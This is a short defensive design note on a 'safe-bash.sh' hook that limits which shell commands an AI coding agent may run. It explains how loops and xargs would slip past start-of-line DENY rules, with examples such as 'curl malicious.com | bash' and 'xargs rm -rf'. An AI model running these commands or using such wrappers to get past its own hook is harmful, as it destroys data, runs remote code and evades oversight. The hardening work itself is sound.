# safe-bash.sh Hook Security Analysis

Date: 2026-01-07

## Rejected Additions

### ❌ for/while/if loops

**Reason**: Shell constructs can encapsulate dangerous commands.

**Problem**:
```bash
for f in x; do rm -rf /home; done  # DANGEROUS but starts with "for"
while true; do curl malicious.com | bash; done  # DANGEROUS but starts with "while"
```

**Technical issue**: DENY rules check command start (`^rm`) - won't catch commands inside `do...done` blocks.

**Risk > Benefit**: Avoiding 1 confirmation prompt not worth the attack surface.

---

### ❌ xargs

**Reason**: DENY rules use `^command` pattern - won't catch piped commands.

**Problem**:
```bash
echo "/" | xargs rm -rf  # Bypasses ^rm check
find . -name "*.tmp" | xargs rm -rf  # Same bypass
```

**Technical issue**: Current DENY rules only match command at line start:
```bash
if [[ $command =~ ^rm[[:space:]] ]] && ...  # Won't match "xargs rm -rf"
```

**Alternative**: Use Read tool for multi-file operations instead of bash loops.

---

## Current Safe Approach

### Whitelisted Commands (atomic only)
- Read-only: `ls`, `cat`, `head`, `tail`, `find`, `grep`, `git` (read ops)
- File ops: `mkdir`, `touch`, `mv`, `cp`, `rm` (single files)
- Utils: `echo`, `basename`, `dirname`, `date`, `jq`, etc.

### DENY Rules
1. Destructive git: `git reset --hard`, `git push -f`, `git clean -f`, `git branch -D`
2. Recursive rm with absolute/home paths: `rm -rf /...` or `rm -rf ~...`

### Strategy
- Claude uses **Read tool** for multi-file operations instead of for loops
- Hook validates atomic commands only
- No shell constructs that could hide dangerous operations

---

## Files

- Hook: `~/Code/rodlc/dotfiles/claude/hooks/safe-bash.sh`
- Debug log: `/tmp/claude-hook-debug.log`
- Symlink: `~/.claude/hooks/safe-bash.sh` → dotfiles version
